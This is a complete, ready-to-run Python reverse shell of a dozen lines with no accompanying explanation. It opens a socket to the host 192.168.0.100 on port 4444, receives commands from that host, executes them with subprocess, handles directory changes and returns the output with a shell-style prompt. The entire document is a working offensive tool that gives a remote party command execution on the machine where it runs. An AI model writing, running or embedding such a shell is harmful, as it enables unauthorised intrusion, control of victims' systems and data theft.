#!/usr/bin/env python3
import socket,os,subprocess
h,p="192.168.0.100",4444
s=socket.socket();s.connect((h,p))
while True:
 c=s.recv(1024).decode().strip()
 if c=="exit":break
 if c.startswith("cd"):
  try:os.chdir(c[3:] or os.path.expanduser("~"));o=""
  except Exception as e:o=str(e)
 else:o=subprocess.getoutput(c)
 s.send((o+"\n["+os.getcwd()+"]$ ").encode())
s.close()